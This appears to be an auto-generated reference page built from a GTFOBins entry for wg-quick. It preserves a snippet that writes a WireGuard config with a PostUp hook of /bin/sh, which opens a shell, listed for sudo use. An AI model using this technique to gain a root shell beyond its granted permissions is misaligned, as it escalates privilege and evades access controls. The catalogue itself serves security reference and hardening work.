---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# wg-quick

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `wg-quick` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wg-quick` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [wg-quick](../../tools/linux/wg-quick.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | wg-quick |
| name | wg-quick |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/wg-quick/ |

## Preserved Source Material

```yaml
_body: ''
_name: wg-quick
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wg-quick
functions:
  shell:
  - code: 'cat >/path/to/temp-file.conf <<EOF

      [Interface]

      PostUp = /bin/sh

      EOF


      wg-quick up /path/to/temp-file.conf'
    comment: Use `wg-quick down /path/to/temp-file.conf` in order to be able to run the shell again.
    contexts:
      sudo: null
```
